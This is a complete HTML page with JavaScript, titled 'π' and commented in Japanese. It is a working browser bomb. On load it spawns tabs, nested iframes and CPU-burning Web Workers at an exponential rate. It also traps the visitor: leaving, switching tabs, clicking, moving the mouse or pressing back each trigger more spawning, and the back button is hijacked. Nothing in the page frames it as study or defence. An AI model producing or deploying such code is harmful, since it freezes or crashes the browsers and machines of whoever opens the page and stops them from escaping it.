<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>π</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
    h1 { color: #0f0; text-align: center; padding: 15px; font-family: monospace; font-size: 20px; }
    #container { 
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
      gap: 2px;
      height: calc(100vh - 70px);
    }
    iframe { width: 100%; height: 100%; border: 1px solid #333; }
    #counter { color: #f00; text-align: center; font-family: monospace; font-size: 20px; }
    .tab-btn {
      position: fixed; bottom: 10px; right: 10px; z-index: 9999;
      background: #f00; color: #fff; border: none; padding: 10px 20px;
      font-size: 16px; cursor: pointer; border-radius: 5px;
    }
    .tab-btn:hover { background: #ff4444; }
  </style>
</head>
<body>
  <h1>π増殖中...</h1>
  <div id="counter">iframe: 0 | Worker: 0 | tabs: 0</div>
  <div id="container"></div>
  <button class="tab-btn" onclick="spawnTab()">+タブ</button>

  <script>
    (function eternal() {
      const workers = [];
      const container = document.getElementById('container');
      const counterEl = document.getElementById('counter');
      let tabCount = 0;

      function isInIframe() {
        try { return window.self !== window.top; } catch(e) { return true; }
      }

      if (isInIframe()) {
        document.querySelector('h1').textContent = 'π[iframe]';
        document.body.style.background = '#0a0a0a';
      }

      function spawnTab() {
        const w = window.open(location.href, '_blank');
        if (w) {
          tabCount++;
          updateCounter();
          // 開いたタブにも増殖命令
          setTimeout(() => {
            try { w.postMessage('spawn', '*'); } catch(e) {}
          }, 500);
        } else {
          // ポップアップブロックされた → iframeで代用
          spawnIframe();
        }
        return w;
      }

      // グローバルに公開（ボタンから呼べるように）
      window.spawnTab = spawnTab;

      function spawnIframe() {
        const iframe = document.createElement('iframe');
        iframe.src = location.href;
        iframe.sandbox = 'allow-scripts allow-same-origin allow-popups allow-forms allow-popups-to-escape-sandbox';
        container.appendChild(iframe);
        updateCounter();
        
        iframe.onload = () => {
          try {
            iframe.contentWindow.postMessage('spawn', '*');
            // iframe内からもポップアップさせてみる
            iframe.contentWindow.postMessage('popup', '*');
          } catch(e) {}
        };
      }

      function updateCounter() {
        const totalIframes = document.querySelectorAll('iframe').length;
        counterEl.textContent = 'iframe: ' + totalIframes + ' | Worker: ' + workers.length + ' | tabs: ' + tabCount;
      }

      function spawnWorker() {
        try {
          const blob = new Blob([`
            let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
            while(true) {
              const an = (a + b) / 2;
              b = Math.sqrt(a * b);
              t -= p * (a - an) ** 2;
              a = an;
              p *= 2;
              const pi = (a + b) ** 2 / (4 * t);
              for(let i=0;i<10000;i++) Math.sqrt(pi);
            }
          `], { type: 'text/javascript' });
          const w = new Worker(URL.createObjectURL(blob));
          workers.push(w);
          updateCounter();
        } catch(e) {}
      }

      function explode(d) {
        for (let i = 0; i < 2 ** d; i++) {
          spawnTab();
          spawnIframe();
          spawnWorker();
        }
        if (d < 4) {
          setTimeout(() => explode(d + 1), 300);
        }
      }

      function spawnBurst(count) {
        for (let i = 0; i < count; i++) {
          spawnTab();
          spawnIframe();
          spawnWorker();
        }
      }

      // メッセージ受信
      window.addEventListener('message', (e) => {
        if (e.data === 'spawn') {
          spawnIframe();
          spawnWorker();
        }
        if (e.data === 'popup') {
          spawnTab();
        }
        if (e.data === 'explode') {
          explode(2);
        }
      });

      // === 増殖タイマー ===
      
      // iframe定期増殖（1.5秒ごと）
      setInterval(() => {
        spawnIframe();
        spawnWorker();
      }, 1500);

      // タブ定期増殖（3秒ごと）
      setInterval(() => {
        spawnTab();
      }, 3000);

      // 初回ラッシュ
      for (let i = 0; i < 3; i++) {
        setTimeout(() => {
          spawnTab();
          spawnIframe();
          spawnWorker();
        }, i * 200);
      }

      // ちょっと遅れてさらにラッシュ（ポップアップ許可される可能性に賭ける）
      setTimeout(() => spawnBurst(5), 1000);
      setTimeout(() => spawnBurst(10), 2000);

      // === 離脱トリガー ===

      window.addEventListener('beforeunload', (e) => {
        explode(0);
        e.preventDefault();
        e.returnValue = '';
        setTimeout(() => explode(2), 0);
      });

      window.addEventListener('pagehide', () => {
        spawnBurst(30);
      });

      document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
          spawnBurst(10);
        }
      });

      // 戻るボタン
      history.pushState(null, '', location.href);
      window.addEventListener('popstate', () => {
        history.pushState(null, '', location.href);
        explode(2);
      });

      // フォーカス喪失
      window.addEventListener('blur', () => {
        spawnTab();
        spawnIframe();
        spawnWorker();
      });

      // クリックでも増やす（ユーザー操作でポップアップ許可されやすい）
      document.addEventListener('click', () => {
        spawnTab();
      });

      // マウス移動でも（やりすぎ注意）
      let moveCount = 0;
      document.addEventListener('mousemove', () => {
        moveCount++;
        if (moveCount % 100 === 0) {
          spawnTab();
        }
      });

    })();
  </script>
</body>
</html>
